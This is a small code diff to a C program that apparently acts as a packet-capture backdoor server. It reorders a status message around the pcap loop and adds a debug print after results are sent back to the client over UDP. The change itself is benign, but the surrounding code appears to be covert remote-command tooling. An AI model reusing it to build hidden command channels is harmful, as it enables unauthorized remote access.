@@ -247,8 +247,8 @@ void server(struct server_opt s_opt){
 	//pcap_close(handle);
 	
 	// Packet capture loop
-	pcap_loop(handle, -1, packet_handler, NULL);
 	printf("Capturing...\n");
+	pcap_loop(handle, -1, packet_handler, NULL);
 }
 
 /*
@@ -410,6 +410,7 @@ void packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char
     memset(output, 0, BD_MAX_REPLY_LEN);
     fread((void *)output, sizeof(char), BD_MAX_REPLY_LEN, fp);
     sendto(sockfd, output, strlen(output), 0, (struct sockaddr *)&dst_host, sizeof(dst_host));
+    printf("Sent results back to client.\n");
     
     /* Cleanup */
     
